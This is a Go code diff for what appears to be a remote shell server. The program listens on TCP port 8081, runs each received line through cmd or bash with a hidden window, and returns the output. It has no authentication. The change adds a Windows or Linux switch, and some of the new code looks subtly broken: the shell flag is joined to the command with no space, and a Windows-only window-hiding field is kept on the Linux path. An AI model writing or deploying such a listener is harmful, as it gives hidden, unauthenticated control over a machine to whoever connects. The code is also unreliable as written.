@@ -10,8 +10,23 @@ import (
 
 	"golang.org/x/text/encoding/charmap"
 )
+/*Set the parameter for use, "win" - for use of a server part on the operational systems of the Windows family, 
+or "lin" - for use of a server part to linux similar systems.
+*/
+var osName = "win" // "win" or "lin"
+
+var shell string
+var arSh string
 
 func main() {
+
+	if osName != "lin" {
+		shell = "cmd"
+		arSh = "/c"
+	} else {
+		shell = "bash"
+		arSh = "-c"
+	}
 
 	ln, _ := net.Listen("tcp", ":8081")
 	conn, _ := ln.Accept()
@@ -21,20 +36,19 @@ func main() {
 		if err != nil {
 			break
 		}
-		message := strings.TrimRight(str, "\r\n")
-		Result := winShellExe(string(message))
+		message := arSh + strings.TrimRight(str, "\r\n")
+
+		Result := winShellExe(shell, string(message))
 		conn.Write([]byte(Result + "<<<<endMessage>>>\n"))
 	}
+
+	conn.Close()
 }
 
-/* "winShellExe" - Function to send command for interpretator OS ...
-Example:
-Result := WinShellExe("whoami")
-return Result */
-func winShellExe(strCommand string) (out string) {
+func winShellExe(shell string, strCommand string) (out string) {
 
 	argsCommand := strings.Split(strCommand, " ")
-	cmd := exec.Command("cmd", argsCommand...)
+	cmd := exec.Command(shell, argsCommand...)
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	stdout, _ := cmd.Output()
 	d := charmap.CodePage866.NewDecoder()
